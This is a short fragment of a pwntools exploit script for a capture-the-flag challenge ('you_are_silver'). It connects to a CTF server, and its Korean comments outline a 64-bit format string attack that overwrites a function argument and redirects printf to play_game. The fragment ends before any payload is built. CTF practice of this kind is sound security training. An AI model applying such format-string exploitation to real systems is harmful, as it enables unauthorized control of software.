from pwn import *

# 64bit fsb
# get_tier 인자를 0x4c로 변조한다
# printf를 play_game으로 변조한다.

p = remote('ctf.j0n9hyun.xyz',3022)
e = ELF('./you_are_silver')
play_game = e.sym['play_game']
buff = 6	# 6번째 인자 
